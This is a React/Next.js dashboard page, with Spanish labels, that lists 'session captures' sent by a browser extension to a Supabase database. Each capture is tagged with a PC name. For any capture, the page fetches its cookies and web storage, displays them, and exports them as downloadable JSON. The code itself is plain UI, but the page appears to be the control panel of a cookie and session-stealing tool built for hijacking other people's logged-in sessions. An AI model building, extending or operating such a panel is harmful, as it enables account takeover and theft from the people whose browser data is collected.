'use client';

import React, { useState, useEffect } from 'react';
import { RefreshCw, Monitor } from 'lucide-react';
import { supabase, SessionSnapshot, Cookie as CookieType } from '@/lib/supabase';
import { SessionCard } from '@/components/dashboard/SessionCard';
import { SessionModal } from '@/components/dashboard/SessionModal';

export default function Dashboard() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<CookieType[]>([]);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);

  const fetchSessions = async () => {
    setLoading(true);
    setIsRefreshing(true);
    const { data, error } = await supabase
      .from('session_snapshots')
      .select('*')
      .order('captured_at', { ascending: false });
    
    if (!error && data) {
      setSessions(data);
    }
    setLoading(false);
    setTimeout(() => setIsRefreshing(false), 500);
  };

  useEffect(() => {
    fetchSessions();
  }, []);

  const handleViewSession = async (session: SessionSnapshot) => {
    const [cookiesRes, storageRes] = await Promise.all([
      supabase.from('cookies').select('*').eq('snapshot_id', session.id),
      supabase.from('web_storage').select('*').eq('snapshot_id', session.id)
    ]);

    if (!cookiesRes.error) setCookies(cookiesRes.data || []);
    if (!storageRes.error) setWebStorage(storageRes.data || []);
    
    setSelectedSession(session);
  };

  const handleExport = async (session: SessionSnapshot) => {
    const [cookiesRes, storageRes] = await Promise.all([
      supabase.from('cookies').select('*').eq('snapshot_id', session.id),
      supabase.from('web_storage').select('*').eq('snapshot_id', session.id)
    ]);

    const exportData = {
      session_info: session,
      cookies: cookiesRes.data || [],
      local_storage: storageRes.data || []
    };

    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `session-${session.pc_name}-${new Date(session.captured_at).getTime()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="max-w-7xl mx-auto pb-12">
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-2xl font-bold text-gray-100">Capturas de Sesión</h1>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 px-3 py-1.5 bg-[#12161F] rounded-full border border-gray-800">
            <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
            <span className="text-xs text-gray-400 font-medium">{sessions.length} capturas</span>
          </div>
          <button 
            onClick={fetchSessions}
            disabled={isRefreshing}
            className="flex items-center gap-2 px-4 py-2 bg-[#12161F] hover:bg-gray-800 text-gray-300 rounded-lg border border-gray-800 transition-colors text-sm font-medium disabled:opacity-50"
          >
            <RefreshCw className={`w-4 h-4 ${isRefreshing ? 'animate-spin text-indigo-400' : ''}`} />
            Actualizar
          </button>
        </div>
      </div>

      {loading && sessions.length === 0 ? (
        <div className="flex flex-col items-center justify-center h-64 space-y-4">
          <div className="w-8 h-8 border-4 border-indigo-500/30 border-t-indigo-500 rounded-full animate-spin"></div>
          <p className="text-gray-500">Cargando capturas...</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
          {sessions.map(session => (
            <SessionCard 
              key={session.id} 
              session={session}
              onViewSession={handleViewSession}
              onExport={handleExport}
            />
          ))}
        </div>
      )}

      {sessions.length === 0 && !loading && (
        <div className="text-center py-20 border border-dashed border-gray-800 rounded-2xl bg-[#0B0E14] mt-8">
          <Monitor className="w-12 h-12 text-gray-700 mx-auto mb-4" />
          <h3 className="text-lg font-medium text-gray-300">No hay sesiones registradas</h3>
          <p className="text-gray-500 max-w-sm mx-auto mt-2">
            La extensión aún no ha enviado ninguna captura a la base de datos.
          </p>
        </div>
      )}

      {selectedSession && (
        <SessionModal 
          session={selectedSession}
          cookies={cookies}
          webStorage={webStorage}
          onClose={() => setSelectedSession(null)}
        />
      )}
    </div>
  );
}
